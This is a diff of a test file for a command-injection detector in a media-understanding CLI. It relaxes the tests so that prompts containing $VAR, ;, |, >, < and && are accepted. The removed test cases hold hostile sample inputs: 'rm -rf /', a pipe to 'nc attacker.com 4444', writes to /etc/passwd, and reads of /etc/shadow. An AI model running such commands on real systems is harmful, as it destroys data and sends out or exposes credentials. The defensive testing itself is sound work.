@@ -15,19 +15,20 @@ describe("CWE-78: Command Injection in media-understanding CLI template context"
       expect(containsShellMetacharacters("describe ${USER} image")).toBe(true);
     });
 
-    it("should reject bare variable expansion $VAR", () => {
-      expect(containsShellMetacharacters("describe $HOME/exploit")).toBe(true);
+    it("should accept prompts with bare $VAR (not exploitable without shell)", () => {
+      expect(containsShellMetacharacters("explain $HOME")).toBe(false);
+      expect(containsShellMetacharacters("what is $PATH?")).toBe(false);
     });
 
-    it("should reject shell command chaining &&", () => {
-      expect(containsShellMetacharacters("describe image && rm -rf /")).toBe(true);
+    it("should accept prompts with ; | > < (not exploitable without shell)", () => {
+      expect(containsShellMetacharacters("describe; focus on color")).toBe(false);
+      expect(containsShellMetacharacters("col1 | col2 | col3")).toBe(false);
+      expect(containsShellMetacharacters("a > b comparison")).toBe(false);
+      expect(containsShellMetacharacters("<value> placeholder")).toBe(false);
     });
 
-    it("should reject shell operators ; | > <", () => {
-      expect(containsShellMetacharacters("describe; whoami")).toBe(true);
-      expect(containsShellMetacharacters("describe | nc attacker.com 4444")).toBe(true);
-      expect(containsShellMetacharacters("describe > /etc/passwd")).toBe(true);
-      expect(containsShellMetacharacters("describe < /etc/shadow")).toBe(true);
+    it("should accept prompts with && (not exploitable without shell)", () => {
+      expect(containsShellMetacharacters("describe image && focus on detail")).toBe(false);
     });
 
     it("should accept normal prompt text", () => {
